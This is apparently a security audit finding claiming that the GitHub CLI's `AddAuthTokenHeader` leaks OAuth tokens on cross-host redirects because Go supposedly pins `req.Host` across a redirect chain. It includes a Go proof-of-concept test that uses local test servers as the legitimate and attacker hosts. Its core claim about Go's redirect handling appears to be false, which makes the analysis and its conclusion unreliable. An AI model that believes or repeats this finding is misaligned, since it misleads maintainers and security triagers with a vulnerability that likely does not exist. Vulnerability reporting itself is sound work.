### Title
Cross-host redirect auth-token leak via `req.Host` field spoofing in `AddAuthTokenHeader` - ([File: api/http_client.go])

### Summary
`AddAuthTokenHeader` (api/http_client.go:151-171) decides whether to attach the `Authorization` header to a request by comparing `getHost(req)` to `getHost(req.Response.Request)`, where `getHost()` prefers `r.Host` over `r.URL.Host` (api/http_client.go:197-202). Because `gh` intentionally sets `req.Host` on the outgoing request ("the real host ... inserted at request time", api/http_client.go:34-35) rather than relying solely on `req.URL`, and because Go's `net/http` client copies the *original* request's `Host` field (`ireq.Host`, `ireq := reqs[0]`) into every subsequent redirect `Request` regardless of where the `Location` header actually points, the two `getHost()` values will always match across an entire redirect chain whenever `req.Host` was explicitly set — even though the real network destination (`req.URL.Host`, used for TCP dial/TLS SNI) has changed to an attacker-controlled host.

### Finding Description
- `getHost()` prioritizes `r.Host`: `if r.Host != "" { return r.Host }; return r.URL.Host` (api/http_client.go:197-202).
- `AddAuthTokenHeader` only withholds the token when `getHost(req) != getHost(req.Response.Request)` (api/http_client.go:156-162), intended to stop tokens leaking to a different host after a redirect.
- `gh`'s HTTP clients are built with a placeholder `Host: "none"` and rely on the caller setting the real target host on the `http.Request.Host` field before the call (api/http_client.go:34-35; demonstrated by tests explicitly doing `req.Host = tt.host` in `api/http_client_test.go`, e.g. lines 195, 356, 377).
- Go's standard library `http.Client` redirect-following logic constructs each redirect `Request` with `Host: ireq.Host`, where `ireq` is the **first** request in the whole redirect chain — not derived from the `Location` header's host. `req.Host` therefore stays pinned to the original host string for the entire chain, while `req.URL.Host` (which actually determines the TCP/TLS destination) is updated to whatever the attacker's `Location` header specifies.
- Consequence: for any request where `req.Host` was set (which is the standard pattern used by `gh`), `getHost(req)` and `getHost(req.Response.Request)` are always identical throughout a redirect chain, so `redirectHostnameChange` is always `false`, and the check is defeated. The `Authorization: token …` header is then attached and sent over the network to whatever host `req.URL.Host` actually resolves/dials to (the attacker-controlled redirect target), regardless of the (unchanged, spoofed-looking) `req.Host` value.
- Note: this is distinct from the currently-tested scenario in `TestHTTPClientRedirectAuthenticationHeaderHandling` (api/http_client_test.go:212-244), where the initial request is built with plain `http.NewRequest` and no explicit `req.Host` — in that case `getHost()` falls back to `r.URL.Host`, which *does* change correctly on redirect, so the existing test passes. The bug only manifests once `req.Host` is explicitly populated by the caller, which is exactly the pattern `gh` uses in production (`opts.Config != nil` path in `NewHTTPClient`, and the "real host ... inserted at request time" design).

### Impact Explanation
An attacker who controls responses from a host the victim points `gh` at (custom `GH_HOST`, GHES alias, or any server the victim is induced to hit) can issue an HTTP redirect (`Location:` header) to an entirely different, attacker-controlled origin. Because `req.Host` remains pinned to the original hostname across the whole redirect chain, `AddAuthTokenHeader` will still attach the victim's OAuth/PAT `Authorization` header, and that authenticated request is actually sent to the attacker's server (since `req.URL.Host` — not `req.Host` — governs the real network destination). This results in token/credential exfiltration to an attacker-controlled origin, matching a "sensitive/authentication credential disclosure to an unauthorized host" impact class.

### Likelihood Explanation
Feasible for any host under attacker control that the victim configures `gh` to talk to (e.g. via `GH_HOST`, `--hostname`, or an enterprise alias), since the attacker fully controls the HTTP response (status code + `Location` header) of their own server. No MITM, admin rights, or leaked token are required — only that `gh` sends the initial authenticated request with `req.Host` set (the standard `gh` client construction pattern) to a server the attacker operates, and that the redirect crosses to a different network destination.

### Recommendation
Do not rely on `req.Host`/`getHost()` string equality across a redirect chain, since Go's client copies `ireq.Host` unconditionally. Instead:
- Compare the *actual* dial targets — use `req.URL.Host` (and scheme) consistently for both `getHost(req)` and `getHost(req.Response.Request)` rather than falling back to a caller-set `req.Host` that Go does not update per redirect hop, or
- Compare against the immediately-preceding hop's `req.URL.Host` (not `reqs[0]`), and additionally verify the previous hop's *actual* resolved URL rather than a mutable `Host` field, or
- Use a `CheckRedirect` callback on the `http.Client` to explicitly strip the `Authorization` header (and re-derive/deny it) whenever `req.URL.Host` (of the new redirect target) differs from `via[0].URL.Host`, instead of the current post-hoc `RoundTripper`-based check.

### Proof of Concept
```go
func TestHTTPClientRedirectHostSpoofViaRequestHost(t *testing.T) {
    var attackerSawAuth string
    attacker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        attackerSawAuth = r.Header.Get("Authorization")
        w.WriteHeader(http.StatusNoContent)
    }))
    defer attacker.Close()

    legit := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        // Redirect to attacker's real network location while gh's req.Host
        // (set by caller to "legit.example.com") stays unchanged for the whole chain.
        http.Redirect(w, r, attacker.URL, http.StatusFound)
    }))
    defer legit.Close()

    client, err := NewHTTPClient(HTTPClientOptions{
        Config: tinyConfig{
            "legit.example.com:oauth_token": "SECRET-TOKEN",
        },
    })
    require.NoError(t, err)

    req, err := http.NewRequest("GET", legit.URL, nil)
    require.NoError(t, err)
    req.Host = "legit.example.com" // gh's standard "insert real host at request time" pattern

    _, err = client.Do(req)
    require.NoError(t, err)

    // BUG: token leaked to attacker.URL because req.Host stayed "legit.example.com"
    // across the redirect (Go copies reqs[0].Host), even though the real
    // network destination (req.URL.Host) became the attacker's server.
    assert.Empty(t, attackerSawAuth, "Authorization must not be sent to attacker host")
}
```
Expected (buggy) result: `attackerSawAuth` is non-empty (`"token SECRET-TOKEN"`), proving the token was sent to the attacker's actual server despite the intended cross-host protection. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** api/http_client.go (L33-41)
```go
func NewHTTPClient(opts HTTPClientOptions) (*http.Client, error) {
	// Provide invalid host, and token values so gh.HTTPClient will not automatically resolve them.
	// The real host and token are inserted at request time.
	clientOpts := ghAPI.ClientOptions{
		Host:               "none",
		AuthToken:          "none",
		LogIgnoreEnv:       true,
		SkipDefaultHeaders: opts.SkipDefaultHeaders,
	}
```

**File:** api/http_client.go (L151-171)
```go
// AddAuthTokenHeader adds an authentication token header for the host specified by the request.
func AddAuthTokenHeader(rt http.RoundTripper, cfg tokenGetter) http.RoundTripper {
	return &funcTripper{roundTrip: func(req *http.Request) (*http.Response, error) {
		// If the header is already set in the request, don't overwrite it.
		if req.Header.Get(authorization) == "" {
			var redirectHostnameChange bool
			if req.Response != nil && req.Response.Request != nil {
				redirectHostnameChange = getHost(req) != getHost(req.Response.Request)
			}
			// Only set header if an initial request or redirect request to the same host as the initial request.
			// If the host has changed during a redirect do not add the authentication token header.
			if !redirectHostnameChange {
				hostname := ghauth.NormalizeHostname(getHost(req))
				if token, _ := cfg.ActiveToken(hostname); token != "" {
					req.Header.Set(authorization, fmt.Sprintf("token %s", token))
				}
			}
		}
		return rt.RoundTrip(req)
	}}
}
```

**File:** api/http_client.go (L197-202)
```go
func getHost(r *http.Request) string {
	if r.Host != "" {
		return r.Host
	}
	return r.URL.Host
}
```

**File:** api/http_client_test.go (L212-244)
```go
func TestHTTPClientRedirectAuthenticationHeaderHandling(t *testing.T) {
	var request *http.Request
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		request = r
		w.WriteHeader(http.StatusNoContent)
	}))
	defer server.Close()

	var redirectRequest *http.Request
	redirectServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		redirectRequest = r
		http.Redirect(w, r, server.URL, http.StatusFound)
	}))
	defer redirectServer.Close()

	client, err := NewHTTPClient(HTTPClientOptions{
		Config: tinyConfig{
			fmt.Sprintf("%s:oauth_token", strings.TrimPrefix(redirectServer.URL, "http://")): "REDIRECT-TOKEN",
			fmt.Sprintf("%s:oauth_token", strings.TrimPrefix(server.URL, "http://")):         "TOKEN",
		},
	})
	require.NoError(t, err)

	req, err := http.NewRequest("GET", redirectServer.URL, nil)
	require.NoError(t, err)

	res, err := client.Do(req)
	require.NoError(t, err)

	assert.Equal(t, "token REDIRECT-TOKEN", redirectRequest.Header.Get(authorization))
	assert.Equal(t, "", request.Header.Get(authorization))
	assert.Equal(t, 204, res.StatusCode)
}
```

**File:** api/http_client_test.go (L366-382)
```go
func TestNewHTTPClientWithoutTelemetryDisabler(t *testing.T) {
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNoContent)
	}))
	defer ts.Close()

	client, err := NewHTTPClient(HTTPClientOptions{})
	require.NoError(t, err)

	req, err := http.NewRequest("GET", ts.URL, nil)
	require.NoError(t, err)
	req.Host = "ghes.example.com"

	res, err := client.Do(req)
	require.NoError(t, err)
	assert.Equal(t, 204, res.StatusCode)
}
```
